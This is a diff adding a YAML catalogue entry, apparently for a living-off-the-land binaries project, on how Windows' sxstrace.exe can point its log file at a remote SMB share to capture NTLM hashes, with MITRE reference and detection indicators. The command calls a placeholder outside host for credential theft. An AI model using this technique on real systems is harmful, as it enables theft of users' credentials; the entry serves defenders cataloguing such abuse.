@@ -1,0 +1,27 @@
+---
+Name: sxstrace.exe
+Description: Diagnoses side-by-side problems
+Author: Bourbon Jean-Marie
+Created: 2020-01-24
+Commands:
+  - Command: sxstrace trace -logfile:\\192.168.xx.xx\a  or sxstrace parse -logfile:\\192.168.XX.XX\lol.etl  -outfile:a.txt 
+    Description: Enforce SMB authentication to access a remote file. Note that -logfile parameter do not support SMB authentication.
+    Usecase: Collect NTLM hash by abusing -logfile parameter via SMB based authentication
+    Category: Credentials
+    Privileges: Required user privs
+    MitreID: T1187
+    MitreLink: https://attack.mitre.org/techniques/T1187/
+    OperatingSystem: All Microsoft Windows (tested on 2008/10/7)
+Full_Path:
+  - Path: C:\windows\system32\sxstrace.exe
+Code_Sample: 
+  - Code: nc
+Detection: 
+  - IOC: Event ID 5140
+  - IOC: sxstrace.exe spawned, SMB authentication
+Resources:
+  - Link: https://twitter.com/kmkz_security/status/1220726401655025665
+Acknowledgement:
+  - Person: Jean-Marie Bourbon
+    Handle: @kmkz_security
+---
